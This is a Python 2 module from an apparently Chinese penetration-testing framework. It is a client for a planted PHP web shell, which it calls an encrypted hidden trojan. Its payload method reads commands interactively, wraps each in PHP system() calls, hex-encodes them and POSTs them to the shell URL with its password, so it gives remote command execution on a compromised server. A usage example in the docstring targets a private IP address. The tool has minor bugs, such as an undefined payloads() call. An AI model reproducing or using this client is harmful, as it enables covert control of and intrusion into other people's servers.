#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import urllib
import urllib2
import binascii
import base64

#模块使用说明
docs = '''

__date__:2016.9.18
__author__:nmask
__Blog__:http://thief.one
__Python_Version_:2.7.11

Pycmd加密隐形木马：
利用方式如下
ple > set target http://10.0.3.13/test/p.php
ple > set passwd test
ple > run
PHP_Shell> whoami
ststem/administrator

'''

from modules.exploit import BGExploit



headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)'}

RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
WHITE = '\033[1;37m'
BLUE='\033[1;34m'
END = '\033[0m'

class PLScan(BGExploit):
    
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "Pycmd加密隐形木马连接-php",  # 该POC的名称
            "product": "Pycmd加密隐形木马连接-php",  # 该POC所针对的应用名称,
            "product_version": "1.0",  # 应用的版本号
            "desc": '''
                web一句话连接客户端
                php网站木马地址：http://10.0.3.13/test/p.php
                jsp网站木马地址：http://192.168.10.149:8080/Test/1.jsp
            ''',  # 该POC的描述
            "author": ["nmask"],  # 编写POC者
            "ref": [
                {self.ref.url: "https://xianzhi.aliyun.com/forum/read/1871.html"},  # 引用的url
                {self.ref.bugfrom: "https://thief.one"},  # 漏洞出处
            ],
            "type": self.type.rce,  # 漏洞类型
            "severity": self.severity.high,  # 漏洞等级
            "privileged": True,  # 是否需要登录
            "disclosure_date": "2016-09-18",  # 漏洞公开时间
            "create_date": "2017-07-17",  # POC 创建时间
        }

        #自定义显示参数
        self.register_option({
            "target": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "目标地址",
                "Required":"no"
            },
            "port": {
                "default": 4444,
                "convert": self.convert.int_field,
                "desc": "目标端口",
                "Required":""
            },
            "debug": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "用于调试，排查poc中的问题",
                "Required":""
            },
            "mode": {
                "default": "payload",
                "convert": self.convert.str_field,
                "desc": "执行exploit,或者执行payload",
                "Required":""
            },
            #以下内容可以自定义
            "passwd": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "webshell password",
                "Required":"no"
            }
        })
        
        #自定义返回内容
        self.register_result({
            #检测标志位，成功返回置为True,失败返回False
            "status": False,
            "exp_status":False, #exploit，攻击标志位，成功返回置为True,失败返回False
            #定义返回的数据，用于打印获取到的信息
            "data": {

            },
            #程序返回信息
            "description": " ",
            "error": ""
        })
        
    def payload(self):
        url = self.option.target['default']
        password = self.option.passwd['default']
        
        try:
            content=''
            cmd=raw_input(GREEN+'PHP_Shell>'+END)
            while(cmp(cmd,"q")):
                if cmd != "":
                    content  = 'system'+'('+'"'+cmd+'"'+');'
                    content  = binascii.b2a_hex(content)
                    postdata = urllib.urlencode({
                        password:content})
                    req = urllib2.Request(
					url = url,            								#木马url地址
					data = postdata,
					headers = headers
					)
                    response = urllib2.urlopen(req).read()
                    print response
                    cmd = raw_input(GREEN+'PHP_Shell>'+END)
                else:
                    cmd = raw_input(GREEN+'PHP_Shell>'+END)
        except Exception,e:
            print e       
    def exploit(self):
        payloads()


#下面为单框架程序执行，可以省略
if __name__ == '__main__':
    from main import main
    main(PLScan())
